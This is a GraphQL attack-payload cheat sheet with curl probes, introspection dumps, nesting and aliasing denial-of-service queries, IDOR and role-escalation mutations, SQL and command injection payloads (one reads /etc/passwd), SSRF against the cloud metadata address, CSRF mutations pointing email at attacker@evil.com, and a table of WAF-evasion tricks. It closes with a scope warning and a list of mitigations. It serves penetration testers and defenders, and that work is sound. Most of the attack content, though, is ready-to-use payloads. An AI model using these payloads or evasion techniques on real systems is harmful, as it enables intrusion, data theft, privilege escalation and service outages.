# GRAPHQL ATTACK PAYLOADS

[GRAPHQL VOYAGER (SCHEMA VISUALIZER)](https://apis.guru/graphql-voyager/) · [GRAPHIQL](https://github.com/graphql/graphiql) · [INQL / GRAPHQL COP](https://github.com/doyensec/inql)

Endpoint Discovery

    curl -X POST -H 'Content-Type: application/json' -d '{"query":"{__typename}"}' [URL]/graphql

Introspection Query (Schema Dump)

    curl -X POST -H 'Content-Type: application/json' -d '{"query":"query{__schema{types{name,fields{name}}}}"}' [URL]/graphql

A GraphQL request is a single `query`/`mutation`/`subscription` document sent to one endpoint. Most GraphQL attacks target either over-permissive introspection, missing query-complexity limits, broken authorization at the field/resolver level, or trusting client-supplied structure — not breaking the transport or protocol itself.

## Structure Reference

| Part | Contains | Relevance |
|---|---|---|
| Endpoint | Usually a single `/graphql` POST endpoint | Centralizes all operations behind one URL — REST-style endpoint enumeration doesn't apply, but operation/field enumeration does |
| Query/Mutation | Selected fields, arguments, nested selections | Attacker-controlled shape — depth, breadth, and aliasing are all client-defined unless the server restricts them |
| Schema (via introspection) | Types, fields, arguments, deprecated fields, directives | If introspection is enabled, this is a full map of the API's capabilities, including unlinked/internal-only operations |
| Resolvers | Server-side logic executing each field | The actual security boundary — every attack here is really an attempt to reach a resolver without satisfying its intended authorization/rate checks |

## Reconnaissance Attacks

| Technique | Payload | Purpose |
|---|---|---|
| Introspection dump | `{"query":"query{__schema{types{name fields{name args{name type{name}}}}}}"}` | Enumerates the full schema — types, fields, arguments, mutations — even ones not used by the front end |
| Field suggestion abuse | `{"query":"{usr}"}` (intentional typo) | Many servers return "did you mean `user`?" errors even with introspection disabled, leaking schema info field-by-field |
| `__typename` probing | `{"query":"{__typename}"}` | Confirms a working GraphQL endpoint and engine fingerprint from error formatting |
| Deprecated field discovery | `{"query":"query{__schema{types{fields(includeDeprecated:true){name isDeprecated deprecationReason}}}}"}` | Deprecated fields are often still resolvable and less actively monitored/secured |
| Batch query enumeration | `[{"query":"{a:user(id:1){id}}"},{"query":"{b:user(id:2){id}}"}]` | Sends multiple operations in one HTTP request, useful for bypassing per-request rate limiting during recon |

## Denial-of-Service / Resource Exhaustion

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Deeply nested query (circular relations) | `{"query":"{user{friends{friends{friends{friends{id}}}}}}"}` (extended many levels) | Exploits unbounded query depth on self-referential types to cause exponential resolver work |
| Field/alias duplication (aliasing abuse) | `{"query":"{a1:user(id:1){id} a2:user(id:1){id} a3:user(id:1){id} ... a1000:user(id:1){id}}"}` | Each alias forces a separate resolver execution in a single request, multiplying backend load |
| Array batching DoS | `[{"query":"{expensiveField}"}, {"query":"{expensiveField}"}, ...]` (thousands of entries) | If batched array requests aren't capped or rate-limited per-item, this multiplies cost cheaply |
| Circular fragment / fragment bomb | `fragment F1 on Query{...F2} fragment F2 on Query{...F1}` | Mutually referencing fragments can cause unbounded expansion if the server doesn't detect cycles before execution |
| Large list pagination abuse | `{"query":"{users(first:999999999){id}}"}` | Requests an unbounded result set if `first`/`limit` arguments aren't server-side capped |

## Authorization / Access Control Attacks

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Direct object reference via ID | `{"query":"{user(id:\"2\"){email ssn}}"}` (while authenticated as user 1) | IDOR equivalent — tests whether resolver-level ownership checks are enforced, not just route-level |
| Mutation field over-exposure | `{"query":"mutation{updateUser(id:\"2\",role:\"admin\"){id role}}"}` | Tests whether mutations enforce the same authz as the UI implies, since the schema may expose more than the front end uses |
| Unused/internal field access | `{"query":"{adminDashboardStats{revenue}}"}` (field found only via introspection, not used by any client) | Internal or admin-only fields often share a schema with public ones and may lack independent authz checks |
| Bypassing field-level masking via aliasing | `{"query":"{me{...UserFields} other:user(id:\"2\"){...UserFields}}"}` | Tests whether authorization is applied per top-level query vs. genuinely per requested object |

## Injection Attacks (Via Resolver Arguments)

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| SQL/NoSQL injection through arguments | `{"query":"{user(username:\"admin' OR '1'='1\"){id}}"}` | GraphQL itself doesn't prevent injection — if a resolver concatenates arguments into a query, it's vulnerable exactly like a REST parameter |
| OS command injection through arguments | `{"query":"{exportReport(filename:\"report.csv; cat /etc/passwd\"){url}}"}` | Same logic — any resolver shelling out with unsanitized input is exploitable regardless of the GraphQL layer |
| Server-Side Request Forgery via URL-accepting fields | `{"query":"mutation{importFromUrl(url:\"http://169.254.169.254/latest/meta-data/\"){status}}"}` | Resolvers that fetch attacker-supplied URLs (webhooks, avatar-from-url, etc.) are SSRF vectors |

## CSRF on GraphQL Endpoints

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| `GET`-based query CSRF | `[URL]/graphql?query={changeEmail(email:"attacker@evil.com"){id}}` | If the endpoint accepts state-changing queries over `GET` with cookie-based auth and no CSRF token, a simple link/image tag can trigger it |
| `content-type: text/plain` form CSRF | Auto-submitting HTML form with `enctype="text/plain"` posting a raw GraphQL query string | Bypasses CORS preflight (simple request) if the server parses `text/plain` bodies as JSON/GraphQL regardless of declared content type |

## EXAMPLE PAYLOADS

**Full introspection query (standard, retrieves entire schema):**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind
      name
      fields(includeDeprecated: true) {
        name
        args { name type { name kind ofType { name kind } } }
        type { name kind ofType { name kind } }
        isDeprecated
        deprecationReason
      }
    }
  }
}
```

**Batching aliasing DoS (abbreviated — real payloads may use hundreds/thousands of aliases):**
```graphql
{
  a1: user(id: 1) { id name email }
  a2: user(id: 1) { id name email }
  a3: user(id: 1) { id name email }
}
```

**Deep nesting DoS on a self-referential type:**
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends { id }
          }
        }
      }
    }
  }
}
```

**IDOR-style authorization test (swap an ID owned by another account):**
```graphql
{
  order(id: "9f3e2-victim-order-id") {
    id
    total
    shippingAddress
    paymentLast4
  }
}
```

**CSRF via GET with state-changing query:**
```
GET /graphql?query=mutation{updateEmail(newEmail:"attacker@evil.com"){id}}
```

## Obfuscation / WAF Evasion

Many GraphQL deployments sit behind a WAF that pattern-matches on known-bad strings (`__schema`, `union`, `OR 1=1`, etc.) rather than actually parsing the query. These techniques reshape a payload's surface form without changing what the resolver receives, so the underlying attack from the sections above still lands.

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Whitespace/newline insertion | `{"query":"query\n{\n  __schema\n  {\n    types{name}\n  }\n}"}` | Breaks signatures matching `__schema{` as a contiguous string while remaining valid GraphQL (whitespace is insignificant to the parser) |
| Query aliasing as a name substitute | `{"query":"{x:__schema{types{name}}}"}` | The alias `x` appears in front of the sensitive field name, which can defeat naive prefix-anchored string matching |
| Operation name padding | `{"query":"query BenignLookingName{__typename}"}` | A friendly, decoy `operationName` can lower a request's risk score in logging/WAF heuristics that weight the named operation |
| Comment injection (GraphQL `#` comments) | `{"query":"{__schema #fetch types\n{types{name}}}"}` | GraphQL supports `#` line comments; inserting harmless comment text inside a sensitive query can split a matched string across lines |
| Case variation on directives/values | `{"query":"{user(ID:\"1\"){EMAIL}}"}` (where the schema is case-sensitive but a downstream filter isn't) | Exploits filters built on case-sensitive string matching; GraphQL field names are still case-sensitive to the server, so this only works where a proxy/WAF layer is the case-insensitive mismatch point |
| Variables instead of inline literals | `{"query":"query($u:String!){user(username:$u){id}}","variables":{"u":"admin' OR '1'='1"}}` | Moves the injection payload out of the `query` string and into the `variables` JSON object, evading filters that only inspect the query text for injection patterns |
| Persisted query / query batching via POST body restructuring | `{"id":"<persisted-query-hash>","variables":{"id":"2"}}` | If persisted queries are supported, the sensitive operation never appears in the request body at all — only a hash and variables, which most signature-based filters won't recognize |
| Encoding the entire body | `application/x-www-form-urlencoded` or alternate `Content-Type` carrying the same JSON payload | Some WAF rule sets only inspect `application/json` bodies closely; sending an equivalent payload under a less-scrutinized content type can bypass content-type-scoped rules if the server still parses it |
| Fragment indirection | `{"query":"{...F} fragment F on Query{__schema{types{name}}}"}` | The sensitive field name is moved out of the operation body and into a separately-declared fragment, which some naive regex-based filters don't traverse into |
| Unicode/escape variation in string arguments | `{"query":"{user(username:\"\\u0061dmin\"){id}}"}` (`\u0061` = `a`) | JSON string escapes are resolved before the value reaches the resolver, so an escaped argument can defeat filters matching literal substrings like `admin` while the server sees the plain value |

**Caveats:**
- These techniques evade pattern-matching defenses, not the application logic itself — the underlying vulnerability (missing depth limit, broken authz, injection-prone resolver) must still exist for any of this to matter.
- A well-configured WAF/gateway for GraphQL parses the query into an AST before filtering, rather than regex-matching the raw string — most of the above only work against naive, string-based rule sets.
- Persisted-query and variable-based evasion are the most reliable in practice, since they don't depend on a filter's specific regex weaknesses — they remove the signature from the inspected surface entirely.

## Tooling Note

Manual probing builds understanding of the underlying flaw, but dedicated tools automate most of these checks against a live target in one pass:

- **InQL** (Burp extension) — schema extraction, query generation, batch attack templates
- **GraphQL Cop** — automated misconfiguration scanner (introspection, batching, CSRF, field suggestions)
- **graphw00f** — GraphQL engine fingerprinting, used to target engine-specific known issues
- **Clairvoyance** — recovers a usable schema even when introspection is disabled, via field-suggestion brute-forcing

Stay within authorized scope — DoS-style batching/nesting payloads can degrade or crash production systems, and forged mutations can cause real data changes.

## Mitigations (for writeups)

- Disable introspection in production, or restrict it to authenticated/internal callers only.
- Disable or sanitize "did you mean" field-suggestion errors in production.
- Enforce query depth limits, query complexity/cost analysis, and a maximum alias/field count per request.
- Enforce authorization at the resolver/field level, not just at the top-level query or transport layer — never assume the front end is the only client.
- Cap and validate all pagination arguments (`first`, `limit`, `last`) server-side regardless of client-supplied values.
- Treat every resolver argument as untrusted input — parameterize database queries, never shell out with raw arguments, and validate/allowlist any server-fetched URLs to prevent SSRF.
- Require CSRF tokens (or enforce strict `Content-Type: application/json` parsing with no `GET` query support) for any cookie-authenticated GraphQL endpoint.
- Rate-limit and cap batched array requests per HTTP call, not just per individual operation.

## Quick Notes

- Most real-world GraphQL vulnerabilities come from missing operational controls (query cost limits, authz at resolver level, introspection left on) rather than a flaw in the GraphQL spec itself.
- Always run an introspection query first (or attempt field-suggestion/Clairvoyance-style recovery if it's disabled) to map available types, fields, and mutations before attempting any other technique.
- A successful unrestricted introspection result is usually the highest-leverage recon finding, since it reveals the entire attack surface — including unlinked admin/internal operations — in one request.
